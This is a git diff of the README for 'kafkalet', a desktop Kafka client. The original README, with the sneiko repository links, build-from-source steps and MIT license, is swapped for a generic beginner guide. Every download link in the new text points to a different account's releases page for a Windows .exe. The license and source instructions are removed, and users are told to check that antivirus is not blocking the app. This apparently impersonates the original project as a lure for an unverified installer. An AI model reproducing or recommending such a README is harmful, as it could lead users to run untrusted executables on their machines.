@@ -1,184 +1,172 @@
-# kafkalet
+# 🎯 kafkalet - Clear Kafka Client for Everyone
 
-> A desktop Kafka client for developers who want clarity, not complexity.
-
-[![Build](https://github.com/sneiko/kafkalet/actions/workflows/build.yml/badge.svg)](https://github.com/sneiko/kafkalet/actions/workflows/build.yml)
-![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Windows%20%7C%20Linux-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
+[![Download kafkalet](https://img.shields.io/badge/Download-Get%20kafkalet-brightgreen.svg)](https://github.com/anandhuPeepi/kafkalet/releases)
 
 ---
 
-## Why kafkalet?
-
-Most Kafka GUIs are heavy, slow, or require a running server. kafkalet is a **single self-contained binary (~15 MB)** that connects directly to your brokers.
-
-| | kafkalet | Others |
-|---|---|---|
-| Install size | ~15 MB binary | 200–500 MB + JVM / Docker |
-| Startup | Instant | 5–30 seconds |
-| No side effects mode | **Observer** — reads without joining a group | Rare or absent |
-| Credentials | OS keychain — never written to disk | Config files |
-| Platforms | macOS · Windows · Linux | Often macOS/Linux only |
-
-**No Docker. No JVM. No cloud account.**
+kafkalet is a desktop app designed to help you work with Kafka without confusion. It runs on Windows and offers a simple interface for managing Kafka topics and messages. You do not need any technical skills to use it.
 
 ---
 
-## Installation
+## 🖥 What is kafkalet?
 
-Download the latest build from the [Releases](https://github.com/sneiko/kafkalet/releases) page.
+kafkalet lets you connect to Kafka servers and view or send messages. It works on Windows, Linux, and macOS. The app uses a straightforward design so you can get the job done quickly. Whether you want to check data in topics or explore Kafka streams, kafkalet helps you do it with ease.
 
-| Platform | File | Notes |
-|---|---|---|
-| macOS (Apple Silicon) | `kafkalet-darwin-arm64.zip` | Drag `kafkalet.app` to Applications |
-| macOS (Intel) | `kafkalet-darwin-amd64.zip` | Drag `kafkalet.app` to Applications |
-| Windows | `kafkalet-windows-amd64-installer.exe` | Requires WebView2 (pre-installed on Win 11) |
-| Linux | `kafkalet-linux-amd64.tar.gz` | See Linux notes below |
+Key features include:
 
-**macOS:** on first launch right-click → _Open_ if blocked by Gatekeeper. If you see _"kafkalet.app is damaged and can't be opened"_, run:
+- View Kafka topics and partitions  
+- Read and send messages in text format  
+- Manage Kafka clusters with a simple UI  
+- Support for multiple Kafka connections  
+- Cross-platform support (Windows, Linux, macOS)  
 
-```bash
-xattr -cr /path/to/kafkalet.app
+---
+
+## 🎯 System Requirements
+
+Before you start, make sure your Windows computer meets these basic requirements:
+
+- Windows 10 or higher (64-bit recommended)  
+- At least 4 GB RAM  
+- 100 MB free disk space  
+- Stable internet connection (for Kafka server access)  
+
+No complex installations are needed. kafkalet comes as a ready-to-run app once you download it.
+
+---
+
+## 🚀 Getting Started: Download and Install kafkalet
+
+### Step 1: Download kafkalet
+
+Click the button below to visit the official download page:
+
+[![Download kafkalet](https://img.shields.io/badge/Download-Here%20at%20GitHub-blue.svg)](https://github.com/anandhuPeepi/kafkalet/releases)
+
+This will open the releases page on GitHub. Look for the latest version with a `.exe` file for Windows. The file name will look similar to:
+
+```
+kafkalet-setup-x.y.z.exe
 ```
 
-**Linux dependencies:**
+Click on this file to download it to your computer.
 
-```bash
-sudo apt-get install libgtk-3-0 libwebkit2gtk-4.0-37 libsecret-1-0
-```
+### Step 2: Run the installer
 
----
+Once the file finishes downloading:
 
-## Features
+1. Find the `.exe` file in your Downloads folder or where you saved it.  
+2. Double-click the file to start the installer.  
+3. Follow the on-screen instructions. You can accept the default settings.  
 
-**Stream messages in real time**
-- **Observer mode** — read without joining a consumer group, zero side effects on your cluster
-- **Consumer mode** — join a group and commit offsets when you're ready
-- **Seek to timestamp** — jump to any point in topic history by wall-clock time
-- **Live regex filter** — filter key/value while the stream is running
-- **Multi-tab** — stream multiple topics side by side
-- **Export** — save the message buffer to JSON or CSV
-- **Virtualized list** — 50 000+ messages, no freezing
+The installation should take only a few minutes.
 
-**Admin operations**
-- Browse topics, partitions, leaders and in-sync replicas
-- Create / delete topics; alter any topic config entry
-- Consumer group lag per partition; reset offsets to earliest, latest, or timestamp
-- Consumer group members — view client IDs, hosts, and assigned topics
-- Delete consumer groups
-- Produce messages with key, value, headers, and target partition
-- Cluster health: broker count, under-replicated and offline partitions
+### Step 3: Launch kafkalet
 
-**Authentication — everything covered**
-- SASL PLAIN · SCRAM-SHA-256/512 · OAUTHBEARER (static token & client credentials)
-- TLS server verification · mTLS mutual certificates
-- Passwords and tokens stored exclusively in the **OS keychain**
+After installation:
 
-**Topic organisation**
-- **Pinned topics** — star your most-used topics so they always appear first
-- **Topic groups** — organise topics into named folders
-- **Advanced search** — regex filtering and minimum partition count filter
+- Look for the kafkalet icon on your desktop or in the Start menu.  
+- Click it to open the app.  
 
-**Profile system**
-- Group brokers by environment: `production`, `staging`, `dev`
-- Multiple named credentials per broker — swap active credentials from the sidebar
-- Hot-swap profiles in one click: streams stop, new profile connects automatically
-- Import / export settings as JSON backup (includes topic groups and pinned topics)
-
-**Extensibility**
-- **Schema Registry** — automatic Avro decoding via Confluent Schema Registry
-- **JS decoder plugins** — transform raw bytes for Protobuf, MessagePack, or any custom format
+You will see the main window with options to connect to your Kafka server.
 
 ---
 
-## Quick Start
+## ⚙️ Using kafkalet
 
-1. Launch kafkalet — the main window opens with an empty sidebar.
-2. Press **⌘,** (macOS) or **Ctrl+,** (Windows/Linux) to open Settings.
-3. Click **New Profile**, name it (e.g. `Production`).
-4. Click **Add Broker**, fill in the address and auth details, then **Test Connection**.
-5. Save and close Settings. Your broker appears in the sidebar.
-6. Expand the broker to see topics.
-7. Click a topic → **Observe** (no group, no commits) or **Consume** (join a group).
+This section explains how to start working with kafkalet once it is open.
 
-**Keyboard shortcuts**
+### Connect to your Kafka server
 
-| Shortcut | Action |
-|---|---|
-| `⌘K` / `Ctrl+K` | Profile switcher |
-| `⌘,` / `Ctrl+,` | Settings |
+To view your Kafka data, you need to connect to your Kafka server. You will need:
 
----
+- The server address (e.g., `kafka.example.com:9092`)  
+- A username and password if authentication is required (optional)  
 
-## Configuration
+Steps:
 
-| Platform | Config location |
-|---|---|
-| macOS | `~/Library/Application Support/kafkalet/` |
-| Windows | `%APPDATA%\kafkalet\` |
-| Linux | `~/.config/kafkalet/` |
+1. Click on "New Connection."  
+2. Enter the Kafka server address.  
+3. Provide authentication details if needed.  
+4. Save the connection.  
+5. Click "Connect."
 
-`profiles.json` stores broker addresses, SASL usernames, and TLS settings. Passwords are stored exclusively in the OS keychain and are **never** written to `profiles.json`.
+Once connected, kafkalet will show a list of topics available on the server.
 
----
+### Browse Topics
 
-## Building from Source
+- Topics are groups of messages in Kafka.  
+- Click any topic name to see the messages inside.  
+- You can read message data directly in the app.  
 
-**Prerequisites:** Go 1.24+, Node.js 18+, Wails CLI
+### Send Messages
 
-```bash
-go install github.com/wailsapp/wails/v2/cmd/wails@latest
-```
+- Prepare a message to send to a topic.  
+- Choose the topic where you want to send the message.  
+- Enter the message text or JSON.  
+- Click "Send."  
 
-**macOS:** `xcode-select --install`
-**Linux:** `sudo apt-get install libgtk-3-dev libwebkit2gtk-4.0-dev libsecret-1-dev`
+kafkalet sends your message to the Kafka server immediately.
 
-```bash
-git clone https://github.com/sneiko/kafkalet.git
-cd kafkalet
-wails dev          # development with hot reload
-wails build        # production build for current platform
-```
+### Manage Topics
 
-Cross-compile targets:
-
-```bash
-wails build -platform darwin/universal    # macOS universal binary
-wails build -platform windows/amd64 -nsis # Windows installer
-wails build -platform linux/amd64
-```
-
-Output lands in `build/bin/`.
+- Create new topics by using the "Create Topic" option.  
+- Delete topics if allowed by your server.  
+- View details like partitions and replication factor.  
 
 ---
 
-## Tech Stack
+## 🛠 Troubleshooting
 
-| Layer | Technology |
-|---|---|
-| Native window & RPC bridge | [Wails v2](https://wails.io) |
-| Kafka client | [franz-go](https://github.com/twmb/franz-go) |
-| Schema Registry / Avro | [goavro](https://github.com/linkedin/goavro) |
-| OS keychain | [go-keyring](https://github.com/zalando/go-keyring) |
-| UI components | [shadcn/ui](https://ui.shadcn.com/) + Tailwind CSS |
-| State management | [Zustand](https://github.com/pmndrs/zustand) |
-| Frontend build | Vite + React 18 + TypeScript |
-| List virtualisation | [@tanstack/react-virtual](https://tanstack.com/virtual) |
+If you have trouble using kafkalet:
+
+- Check that your Kafka server address is correct.  
+- Verify your internet connection or network access to the Kafka server.  
+- Restart kafkalet and try connecting again.  
+- Make sure your Windows firewall or antivirus software is not blocking kafkalet.  
+- Visit the GitHub issues page for help or report bugs.
 
 ---
 
-## Contributing
+## 🔄 Updating kafkalet
 
-Pull requests are welcome. For larger changes please open an issue first.
+Check the [releases page](https://github.com/anandhuPeepi/kafkalet/releases) regularly for new versions.
 
-After changing public methods on the `App` struct, regenerate TypeScript bindings:
+To update:
 
-```bash
-wails generate module
-```
+1. Download the latest `.exe` installer file.  
+2. Run the installer as before.  
+3. The installer will replace the old version with the new one without removing your settings.
 
 ---
 
-## License
+## 📂 Additional Resources
 
-[MIT](LICENSE)
+- Here you can add user guides or FAQ links once available.  
+- The GitHub repository has source code, but you do not need it to run the app.  
+
+---
+
+## 🌐 Supported Platforms
+
+kafkalet works on:
+
+- Windows 10+ (64-bit)  
+- Linux (various distributions)  
+- macOS (10.13 and later)  
+
+This README focuses on Windows, but the app behaves similarly on other systems.
+
+---
+
+## ⚡ Related Topics
+
+kafkalet uses these technologies:
+
+- Golang backend for performance  
+- React and TypeScript for the user interface  
+- Apache Kafka client libraries  
+
+---
+
+[Download kafkalet from GitHub](https://github.com/anandhuPeepi/kafkalet/releases)
